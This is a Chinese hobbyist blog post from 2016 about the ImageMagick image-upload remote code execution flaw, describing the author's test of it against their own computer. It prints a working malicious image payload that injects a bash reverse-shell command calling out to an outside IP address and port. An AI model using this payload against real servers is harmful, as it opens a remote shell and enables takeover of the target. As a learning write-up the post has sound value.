---
title: ImageMagick-一次简单的漏洞利用
tags: [ImageMagick,poc,exp]
categories: [信息安全,漏洞]
date: 2016-05-18 03:37:38
---
## ImageMagick漏洞


ImageMagick是一款处理图片的软件，很多网站的后台都在用。

**在周二（不是昨天···），ImageMagick披露出了一个严重的0day漏洞，此漏洞
允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意
代码。Slack安全工程师Ryan Hube发现了这一0day漏洞。**

*上传一张图片，拿下一个网站（服务器）----这不是在做梦！*

## 起因
因为和小伙伴在做一个论坛，用的是WeCenter，放在SAE上，但发现上传不了图片了。加上看到了[新浪云最近对ImageMigick漏洞的处理](http://mp.weixin.qq.com/s?__biz=MjM5NzI0Njc2MA==&mid=2664563189&idx=1&sn=a1296c113b53154796ee9318aa85daa7&scene=1&srcid=0516EwErJ9OEfzzfmuX8c2Gf#wechat_redirect),所以有了玩玩这个漏洞的想法
<!--more-->
## 过程
- 随便一搜ImageMagick漏洞，就有很多poc和exp。我看的是[这篇文章](http://www.tuicool.com/articles/bAzmUbZ)
- 运行PoC没有问题╮(╯_╰)╭
- touch一个文件，改成txt，然后把下面这段代码抄进去，改成自己想测试的数据，然后后缀改成.jpg
```
push graphic-context  
viewbox 0 0 640 480  
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/103.21.140.84/7890 0>&1")'  
pop graphic-context 
```


**重点来了！！**
我没敢日别人的站，就日自己电脑（这话是大神们教我的，总觉得好怪）把端口改成127.0.0.1，上面跑的有本地应用，然后开了一个端口监听，上传图片的时候就选择这张图片，**然后一直显示正在上传~然后我的mac一点点升温！直到烫的不能用！**要不是早点杀掉进程，估计我就被烫死了。。。这哪里是日站，简直就是物理攻击啊！我还一直以为黑客们的技能都是魔法伤害，这才刚接触就造成了这么大的物理伤害···
## 尾声
就顾得玩了，SAE的沙箱问题还没解决···先睡觉😪


-------

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="http://music.163.com/outchain/player?type=2&id=2001320&auto=1&height=66"></iframe>





